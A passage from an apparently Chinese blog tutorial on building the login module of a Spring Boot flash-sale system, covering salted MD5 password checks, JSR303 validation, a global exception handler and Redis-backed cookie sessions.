class="hljs-string">&quot;mobile=&#x27;&quot;</span> + mobile + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, password=&#x27;&quot;</span> + password + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写登录数据库对应实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaUser</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> String nickname;<br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-keyword">private</span> String salt;<br>    <span class="hljs-keyword">private</span> String head;<br>    <span class="hljs-keyword">private</span> Date registerDate;<br>    <span class="hljs-keyword">private</span> Date lastLoginDate;<br>    <span class="hljs-keyword">private</span> Integer loginCount;<br><br>    <span class="hljs-comment">//getter and setter</span><br>&#125;<br></code></pre></td></tr></table></figure><p>编写MiaoshaUserDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">MiaoshaUserDao</span> </span>&#123;<br><br>    <span class="hljs-meta">@Select(&quot;select * from miaosha_user where id = #&#123;id&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaUser <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span>Long id)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写MiaoshaUserService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiaoshaUserService</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaUserDao miaoshaUserDao;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> MiaoshaUser <span class="hljs-title">getById</span><span class="hljs-params">(Long id)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> miaoshaUserDao.getById(id);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> CodeMsg <span class="hljs-title">login</span><span class="hljs-params">(LoginVo loginVo)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(loginVo == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.SERVER_ERROR;<br>        &#125;<br>        String mobile = loginVo.getMobile();<br>        String formPass = loginVo.getPassword();<br>        <span class="hljs-comment">//查询user</span><br>        MiaoshaUser user = getById(Long.parseLong(mobile));<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.MOBILE_NOT_EXIST;<br>        &#125;<br>        <span class="hljs-comment">//验证密码</span><br>        String dbPass = user.getPassword();<br>        String saltDB = user.getSalt();<br>        <span class="hljs-comment">//前端已经做过一次md5加密</span><br>        String calcPass = MD5Util.formPassToDBPass(formPass,saltDB);<br>        <span class="hljs-keyword">if</span> (!calcPass.equals(dbPass))&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.PASSWORD_ERROR;<br>        &#125;<br>        <span class="hljs-keyword">return</span> CodeMsg.SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写登录Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/login&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginController</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Logger log = LoggerFactory.getLogger(LoginController.class);<br><br>    <span class="hljs-meta">@Autowired</span><br>    MiaoshaUserService userService;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/to_login&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toLogin</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/do_login&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;CodeMsg&gt; <span class="hljs-title">doLogin</span><span class="hljs-params">(LoginVo loginVo)</span></span>&#123;<br>        <span class="hljs-comment">//记录日志信息</span><br>        log.info(loginVo.toString());<br>        <span class="hljs-comment">//参数校验</span><br>        String passInput = loginVo.getPassword();<br>        String mobile = loginVo.getMobile();<br>        <span class="hljs-comment">//校验密码输入是否为空</span><br>        <span class="hljs-keyword">if</span>(StringUtils.isEmpty(passInput))&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.PASSWORD_EMPTY);<br>        &#125;<br>        <span class="hljs-comment">//校验手机号输入是否为空</span><br>        <span class="hljs-keyword">if</span>(StringUtils.isEmpty(mobile))&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MOBILE_EMPTY);<br>        &#125;<br>        <span class="hljs-comment">//校验手机号格式</span><br>        <span class="hljs-keyword">if</span>(!ValidatorUtil.isMobile(mobile))&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MOBILE_ERROR);<br>        &#125;<br>        <span class="hljs-comment">//登录并返回 返回信息</span><br>        CodeMsg cm = userService.login(loginVo);<br>        <span class="hljs-keyword">if</span> (cm.getCode() == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(CodeMsg.SUCCESS);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> Result.error(cm);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-JSR303参数检验-全局异常处理器"><a href="#2-3-JSR303参数检验-全局异常处理器" class="headerlink" title="2.3 JSR303参数检验+全局异常处理器"></a>2.3 JSR303参数检验+全局异常处理器</h2><h3 id="2-3-1-JSR303参数检验"><a href="#2-3-1-JSR303参数检验" class="headerlink" title="2.3.1 JSR303参数检验"></a>2.3.1 JSR303参数检验</h3><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用validation可通过注解对参数进行检验，参数传入时可进行检验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/do_login&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;CodeMsg&gt; <span class="hljs-title">doLogin</span><span class="hljs-params">(<span class="hljs-meta">@Valid</span> LoginVo loginVo)</span></span>&#123;<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>LoginVo可改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginVo</span> </span>&#123;<br><br>    <span class="hljs-comment">//用于接收登录参数的实体类</span><br><br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-meta">@IsMobile</span><br>    <span class="hljs-keyword">private</span> String mobile;<br><br>    <span class="hljs-meta">@NotNull</span><br>    <span class="hljs-meta">@Length(min = 32)</span><br>    <span class="hljs-keyword">private</span> String password;<br></code></pre></td></tr></table></figure><p>其中@IsMobile需要自定义，可点开@NotNull参考</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@java</span>.lang.annotation.Target(&#123;java.lang.annotation.ElementType.METHOD, java.lang.annotation.ElementType.FIELD, java.lang.annotation.ElementType.ANNOTATION_TYPE, java.lang.annotation.ElementType.CONSTRUCTOR, java.lang.annotation.ElementType.PARAMETER, java.lang.annotation.ElementType.TYPE_USE&#125;)<br><span class="hljs-meta">@java</span>.lang.annotation.Retention(java.lang.annotation.RetentionPolicy.RUNTIME)<br><span class="hljs-meta">@java</span>.lang.annotation.Documented<br><span class="hljs-meta">@javax</span>.validation.Constraint(validatedBy = &#123;IsMobileValidator.class&#125;)<br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> IsMobile &#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">required</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">true</span></span>;<br><br>    java.lang.<span class="hljs-function">String <span class="hljs-title">message</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> &quot;手机号码格式有误&quot;</span>;<br><br>    java.lang.Class&lt;?&gt;[] groups() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    java.lang.Class&lt;? extends javax.validation.Payload&gt;[] payload() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写IsMobileValidator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IsMobileValidator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ConstraintValidator</span>&lt;<span class="hljs-title">IsMobile</span>, <span class="hljs-title">String</span>&gt; </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> required = <span class="hljs-keyword">false</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initialize</span><span class="hljs-params">(IsMobile constraintAnnotation)</span> </span>&#123;<br>        required = constraintAnnotation.required();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValid</span><span class="hljs-params">(String value, ConstraintValidatorContext context)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (required)&#123;<br>            <span class="hljs-keyword">return</span> ValidatorUtil.isMobile(value);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (StringUtils.isEmpty(value))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> ValidatorUtil.isMobile(value);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原来登录中的参数校验逻辑可以删除</p><h3 id="2-3-2-全局异常处理"><a href="#2-3-2-全局异常处理" class="headerlink" title="2.3.2 全局异常处理"></a>2.3.2 全局异常处理</h3><p>参数校验只替代了原有代码的校验功能，但没有返回相关的异常信息，当校验出现问题时抛出的异常信息应该得到处理。实现方式是实现一个全局的拦截器，这要用到注解@ControllerAdvice，可以处理所有的controller方法抛出的异常</p><p>在该类中，可以定义多个方法，不同的方法处理不同的异常，例如专门处理空指针的方法、专门处理数组越界的方法…，也可以在一个方法中处理所有的异常信息。</p><p>@ExceptionHandler 注解用来指明异常的处理类型，即如果这里指定为 NullpointerException，则数组越界异常就不会进到这个方法中来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GlobleExceptionHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">//指定当前方法处理Exception类</span><br>    <span class="hljs-meta">@ExceptionHandler(value = Exception.class)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">exceptionHandler</span><span class="hljs-params">(HttpServletRequest request,Exception e)</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> BindException)&#123;<br>            <span class="hljs-comment">//如果当前异常属于绑定异常，将绑定异常的错误信息打印</span><br>            <span class="hljs-comment">//instanceof是Java中的二元运算符，左边是对象，右边是类；当对象是右边类或子类所创建对象时，返回true；否则，返回false。</span><br>            BindException ex = (BindException)e;<br>            List&lt;ObjectError&gt; errors = ex.getAllErrors();<br>            ObjectError error = errors.get(<span class="hljs-number">0</span>);<br><br>            String msg = error.getDefaultMessage();<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.BIND_ERROR.fillArgs(msg));<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//否则报服务器异常</span><br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SERVER_ERROR);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当前还存在一些问题，在MiaoshaUserService中login()方法对登录参数进行数据库校验的时候，返回的类是CodeMsg，我们通常不直接返回错误状态信息，而是返回与登录密切相关的语义即登录失败还是成功，原代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> CodeMsg <span class="hljs-title">login</span><span class="hljs-params">(LoginVo loginVo)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(loginVo == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.SERVER_ERROR;<br>        &#125;<br>        String mobile = loginVo.getMobile();<br>        String formPass = loginVo.getPassword();<br>        <span class="hljs-comment">//查询user</span><br>        MiaoshaUser user = getById(Long.parseLong(mobile));<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.MOBILE_NOT_EXIST;<br>        &#125;<br>        <span class="hljs-comment">//验证密码</span><br>        String dbPass = user.getPassword();<br>        String saltDB = user.getSalt();<br>        <span class="hljs-comment">//前端已经做过一次md5加密</span><br>        String calcPass = MD5Util.formPassToDBPass(formPass,saltDB);<br>        <span class="hljs-keyword">if</span> (!calcPass.equals(dbPass))&#123;<br>            <span class="hljs-keyword">return</span> CodeMsg.PASSWORD_ERROR;<br>        &#125;<br>        <span class="hljs-keyword">return</span> CodeMsg.SUCCESS;<br>    &#125;<br></code></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">login</span><span class="hljs-params">(LoginVo loginVo)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(loginVo == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.SERVER_ERROR);<br>        &#125;<br>        String mobile = loginVo.getMobile();<br>        String formPass = loginVo.getPassword();<br>        <span class="hljs-comment">//查询user</span><br>        MiaoshaUser user = getById(Long.parseLong(mobile));<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.MOBILE_NOT_EXIST);<br>        &#125;<br>        <span class="hljs-comment">//验证密码</span><br>        String dbPass = user.getPassword();<br>        String saltDB = user.getSalt();<br>        String calcPass = MD5Util.formPassToDBPass(formPass,saltDB);<br>        <span class="hljs-keyword">if</span> (!calcPass.equals(dbPass))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.PASSWORD_ERROR);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>此时抛出异常到controller，controller的异常会被全局异常处理捕获，全局异常处理逻辑修改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ExceptionHandler(value = Exception.class)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">exceptionHandler</span><span class="hljs-params">(HttpServletRequest request,Exception e)</span></span>&#123;<br>       <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> GlobleException)&#123;<br>           <span class="hljs-comment">//增加处理抛出异常逻辑，即登录的参数与数据库数据对比</span><br>           GlobleException ex = (GlobleException)e;<br>           <span class="hljs-keyword">return</span> Result.error(ex.getCm());<br>       &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> BindException)&#123;<br>           <span class="hljs-comment">//对参数格式校验的错误异常处理</span><br>           BindException ex = (BindException)e;<br>           List&lt;ObjectError&gt; errors = ex.getAllErrors();<br>           ObjectError error = errors.get(<span class="hljs-number">0</span>);<br><br>           String msg = error.getDefaultMessage();<br>           <span class="hljs-keyword">return</span> Result.error(CodeMsg.BIND_ERROR.fillArgs(msg));<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">return</span> Result.error(CodeMsg.SERVER_ERROR);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>此时登录测试逻辑修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//原代码</span><br>CodeMsg cm = userService.login(loginVo);<br><span class="hljs-keyword">if</span> (cm.getCode() == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">return</span> Result.success(CodeMsg.SUCCESS);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> Result.error(cm);<br>&#125;<br>修改为：<br>userService.login(loginVo);<br><span class="hljs-keyword">return</span> Result.success(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure><h2 id="2-4-分布式Session"><a href="#2-4-分布式Session" class="headerlink" title="2.4 分布式Session"></a>2.4 分布式Session</h2><p>分布式Session一致性解决方案不止一种：</p><ul><li>session复制：从服务器角度，应用服务器开启web容器的session复制功能，在集群中的几台服务器之间同步session对象，使得每台服务器上都保存所有的session信息，这样任何一台宕机都不会导致session的数据丢失，服务器使用session时，直接从本地获取。这种方式在应用集群达到数千台的时候，就会出现瓶颈，每台都需要备份session，出现内存不够用的情况。</li><li>session绑定：利用hash算法，比如nginx的ip_hash,使得同一个Ip的请求分发到同一台服务器上。这种方式不符合对系统的高可用要求，因为一旦某台服务器宕机，那么该机器上的session也就不复存在了，用户请求切换到其他机器后么有session，无法完成业务处理。</li><li>利用cookie记录session：session记录在客户端，每次请求服务器的时候，将session放在请求中发送给服务器，服务器处理完请求后再将修改后的session响应给客户端，<strong>这里的客户端就是cookie。</strong></li><li>session服务器：session服务器可以解决上面的所有的问题<strong>，</strong>利用独立部署的session服务器（集群）统一管理session，服务器每次读写session时，都访问session服务器。</li></ul><p>我们使用cookie记录session。</p><p>修改登录逻辑，登录时存入cookie</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">login</span><span class="hljs-params">(HttpServletResponse response, LoginVo loginVo)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(loginVo == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.SERVER_ERROR);<br>        &#125;<br>        String mobile = loginVo.getMobile();<br>        String formPass = loginVo.getPassword();<br>        <span class="hljs-comment">//查询user</span><br>        MiaoshaUser user = getById(Long.parseLong(mobile));<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.MOBILE_NOT_EXIST);<br>        &#125;<br>        <span class="hljs-comment">//验证密码</span><br>        String dbPass = user.getPassword();<br>        String saltDB = user.getSalt();<br>        String calcPass = MD5Util.formPassToDBPass(formPass,saltDB);<br>        <span class="hljs-keyword">if</span> (!calcPass.equals(dbPass))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> GlobleException(CodeMsg.PASSWORD_ERROR);<br>        &#125;<br>        addCookie();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCookie</span><span class="hljs-params">(MiaoshaUser user,HttpServletResponse response)</span></span>&#123;<br>        <span class="hljs-comment">//生成cookie</span><br>        String token = UUIDUtil.uuid();<br>        redisService.set(MiaoshaUserKey.token,token,user);<br>        Cookie cookie = <span class="hljs-keyword">new</span> Cookie(COOKIE_NAME_TOKEN, token);<br>        cookie.setMaxAge(MiaoshaUserKey.token.expireSeconds());<br>        <span class="hljs-comment">//设置多应用共享</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-comment">//使用response把生成的cookie值传回浏览器</span><br>        response.addCookie(cookie);<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中UUIDUtil:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UUIDUtil</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">uuid</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用户登录后会进行跳转to_list（如果不登录直接进入该页面也应该持有状态），编写相关GoodsController类,作用是读取当前浏览器中的cookie值与redis中的值比较</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 